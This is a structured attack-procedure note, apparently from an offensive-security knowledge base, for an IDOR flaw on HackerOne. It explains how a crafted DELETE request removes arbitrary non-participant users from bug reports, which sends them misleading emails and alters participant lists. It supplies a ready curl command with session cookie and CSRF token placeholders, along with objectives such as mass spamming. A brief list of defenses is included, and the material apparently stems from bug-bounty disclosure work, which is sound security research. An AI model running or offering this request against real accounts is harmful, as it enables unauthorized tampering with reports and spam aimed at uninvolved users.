---
tags:
  - idor
  - spam
  - web
  - hackerone
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/delete-hackerone-external-user]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:25:23.561Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: c70a5a7b-a878-43de-a1d0-8178dedd829e
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Exploit Public-Facing Application]]'
---
# Send-IDOR-Removal-Request

## Summary

This procedure executes the modified DELETE request to remove a non-participant from a HackerOne bug report, triggering unauthorized email notifications and list updates due to IDOR.

## Description

The request succeeds because of missing checks, sending a removal email to the target and incorrectly altering the report. This can be chained for mass spamming. Requires valid session and modified request from prior step.

## Requirements

1. Authenticated session with valid CSRF token and cookies
2. Specific report_id and arbitrary user_id
3. Ability to send HTTP requests (e.g., via curl or proxy)

## Defense

Defensive measures and detection strategies:

- Validate user_id against report participants before processing
- Monitor for anomalous email notifications and rate-limit removals
- Audit logs for mismatched user-report interactions

## Objectives

1. Trigger misleading removal email to arbitrary user
2. Cause confusion in report participant lists
3. Demonstrate potential for spam via platform emails

## Instructions

### Step 1: Prepare and Send Request

**Context**: Use the modified request to target non-participant.

**Command** ([[commands/delete-hackerone-external-user]]):
```bash
curl -X DELETE "https://hackerone.com/reports/<report_id>/external_users/<user_id>" \
  -H "X-CSRF-Token: <token>" \
  -H "Cookie: <cookies>" \
  -H "Referer: <referer>" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate"
```

> This sends the request; expect 200 OK response. The targeted user receives an email about removal, despite never being invited.

### Step 2: Verify Impact

**Context**: Check report and email delivery.

No command; inspect the report UI for updated participant list and confirm email receipt.

> Expected: Incorrect list update and spam email sent.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/delete-hackerone-external-user]]

## Tools Used


## Tags

- [[idor]]
- [[web]]
